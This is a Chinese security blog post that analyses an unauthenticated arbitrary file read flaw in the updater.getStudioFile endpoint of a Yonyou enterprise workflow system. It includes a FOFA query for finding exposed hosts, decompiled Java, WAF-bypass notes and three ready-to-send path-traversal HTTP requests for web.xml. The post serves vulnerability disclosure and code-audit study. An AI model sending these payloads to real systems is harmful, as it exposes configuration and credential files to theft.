---
title: "时空智友企业流程化管控系统 updater.getStudioFile 任意文件读取漏洞"
source: https://mrxn.net/jswz/yonyou-updater-getStudioFile-fileread.html
asset_dir: assets/时空智友企业流程化管控系统-updater.getstudiofile-任意文件读取漏洞
---

# 时空智友企业流程化管控系统 updater.getStudioFile 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/6 18:28
- 1173浏览
- [0评论](#comment)
- 37分钟阅读

深入探索

安全工具开发

VPN服务

数据库

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)时空智友企业流程化管控系统 `updater.getStudioFile` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

漏洞修复方案

# fofa语法

> `body="login.jsp?login=null"`

# 漏洞分析

根据漏洞通告直接搜索 `getStudioFile` 方法即可找到其业务逻辑实现如下

深入探索

Windows安全工具

编程语言教程

云安全解决方案

```
public void getStudioFile(HttpServletRequest object, HttpServletResponse httpServletResponse, String object2) {
    if (a) {
        throw new Exception("\u670d\u52a1\u5668\u5df2\u9501\u5b9a\uff0c\u6587\u4ef6\u65e0\u6cd5\u4e0b\u8f7d\u3002");
    }
    if (!((String)(object2 = ((String)object2).replace('/', '\\'))).startsWith("\\")) {
        object2 = "\\" + (String)object2;
    }
    FormStudioUpdater.a();
    object2 = String.valueOf(d) + (String)object2;
    object = new File((String)object2);
    if (!object.exists()) {
        throw new Exception("\u627e\u4e0d\u5230\u6307\u5b9a\u7684\u6587\u4ef6\uff1a" + (String)object2);
    }
    httpServletResponse.setContentType("application/octet-stream; charset=utf-8");
    httpServletResponse.setHeader("Content-Disposition", "attachment;filename=" + URLEncoder.encode((String)object2, "UTF-8"));
    object2 = null;
    ServletOutputStream servletOutputStream = null;
    try {
        try {
            int n2;
            object2 = new FileInputStream((File)object);
            object = new byte[4096];
            servletOutputStream = httpServletResponse.getOutputStream();
            while ((n2 = ((FileInputStream)object2).read((byte[])object)) != -1) {
                if (!a) {
                    servletOutputStream.write((byte[])object, 0, n2);
                    continue;
                }
                throw new Exception("\u670d\u52a1\u5668\u5df2\u9501\u5b9a\uff0c\u6587\u4ef6\u4e0b\u8f7d\u5931\u8d25\u3002");
            }
        }
        catch (Exception exception) {
            object = exception;
            throw exception;
        }
    }
    catch (Throwable throwable) {
        if (servletOutputStream != null) {
            servletOutputStream.flush();
            servletOutputStream.close();
        }
        if (object2 != null) {
            ((FileInputStream)object2).close();
        }
        throw throwable;
    }
    if (servletOutputStream != null) {
        servletOutputStream.flush();
        servletOutputStream.close();
    }
    ((FileInputStream)object2).close();
}
```

深入探索

网络安全培训

JSON处理工具

Docker加速服务

对 `object2` 中的`/`替换为`\`，并确保路径以`\`开头。然后判断是否存在文件路径，存在就直接读取文件内容并响应在body中，期间对 `object2` 无其余过滤或校验检查，因此造成任意文件读取[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

需要注意的是请求格式，因为并不是走的URL参数，不支持 `Content-Type: application/x-www-form-urlencoded` 格式，支持其他格式 如 `text/plain`、`application/json`、`application/pdf`、`application/zip`、`application/octet-stream` 甚至是 `multipart/form-data` 及其变种畸形格式等，甚至不携带任何 `Content-Type` ， 鉴于这种奇葩传参方式，可能还有多种绕过WAF姿势。

网络安全

而 `FormStudioUpdater.a()` 逻辑如下

```
private static void a() {
    String string;
    if (d == null) {
        string = Configuration.getProperty((String)"updateformstudio");
        if (string == null) {
            string = Configuration.getRealPath((String)"/update/FormStudio");
        }
        d = string;
    }
    if (g == null) {
        string = Configuration.getProperty((String)"studiochangelog");
        if (string == null) {
            string = FileUtility.GetFullPath((String)d, (String)"changelog.txt");
        }
        g = string;
    }
}
```

主要是定义几个变量的值 没啥特殊处理。

安全工具开发

# 漏洞复现

如果直接请求接口会报错，爆出物理路径

[![时空智友企业流程化管控系统 updater.getStudioFile 任意文件读取漏洞](images/img-001-8dd8ae436834.webp)](https://image.mrxn.net/a4f735d2eff34552853727786bde7758.webp)

```
POST /formservice?service=updater.getStudioFile HTTP/1.1
Host: yonyou.mrxn.net
Content-Type: multipart/form-dataaaaaaa

---.

../../WEB-INF/web.xml
```

或者下面这种常规请求方式

漏洞修复方案

```
POST /formservice?service=updater.getStudioFile HTTP/1.1
Host: yonyou.mrxn.net

..\..\WEB-INF\web.xml
```

```
POST /formservice?service=updater.getStudioFile HTTP/1.1
Host: yonyou.mrxn.net
Content-Type: multipart/form-data; boundary=----123456

------123456
Content-Disposition: form-data; name="object2"

../../WEB-INF/web.xml
------123456--
```

[![时空智友企业流程化管控系统 updater.getStudioFile 任意文件读取漏洞](images/img-002-9ada388be15d.webp)](https://image.mrxn.net/91b8412726e345ff99d4fcd760f787e7.webp)

成功读取到 web.xml 文件内容

搜索引擎

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

安全工具开发
